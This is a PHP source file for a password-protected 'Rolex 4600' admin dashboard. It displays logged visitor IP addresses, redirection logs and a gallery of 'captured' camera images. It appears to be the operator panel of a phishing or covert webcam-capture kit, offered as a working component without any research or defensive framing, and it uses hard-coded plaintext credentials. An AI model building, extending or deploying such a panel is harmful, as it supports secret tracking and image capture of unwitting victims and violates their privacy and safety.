/* dashboard.php - Web interface for viewing logged data */
<?php
session_start();

// Basic authentication (change username/password)
$username = "admin";
$password = "securepassword";

// Handle login
if (isset($_POST['login'])) {
    if ($_POST['user'] === $username && $_POST['pass'] === $password) {
        $_SESSION['logged_in'] = true;
    } else {
        echo "<script>alert('Invalid credentials');</script>";
    }
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: dashboard.php");
    exit();
}

// Redirect if not logged in
if (!isset($_SESSION['logged_in'])) {
?>
    <form method="post">
        <label>Username:</label>
        <input type="text" name="user" required>
        <label>Password:</label>
        <input type="password" name="pass" required>
        <button type="submit" name="login">Login</button>
    </form>
<?php
    exit();
}

// Load logs
$ip_log = file_exists("ip.txt") ? file_get_contents("ip.txt") : "No IP logs found.";
$redirect_log = file_exists("redirects.log") ? file_get_contents("redirects.log") : "No redirection logs found.";
$images = glob("cam_*.png");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Rolex 4600 - Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { width: 80%; margin: auto; }
        .logs, .images { margin-top: 20px; }
        img { width: 200px; margin: 5px; }
        .logout { position: absolute; top: 10px; right: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Rolex 4600 - Admin Dashboard</h1>
        <a class="logout" href="?logout=true">Logout</a>

        <h2>IP Logs</h2>
        <pre><?php echo htmlspecialchars($ip_log); ?></pre>

        <h2>Redirection Logs</h2>
        <pre><?php echo htmlspecialchars($redirect_log); ?></pre>

        <h2>Captured Images</h2>
        <div class="images">
            <?php if (!empty($images)) {
                foreach ($images as $img) {
                    echo "<img src='$img' alt='Captured Image'>";
                }
            } else {
                echo "<p>No images captured.</p>";
            } ?>
        </div>
    </div>
</body>
</html>
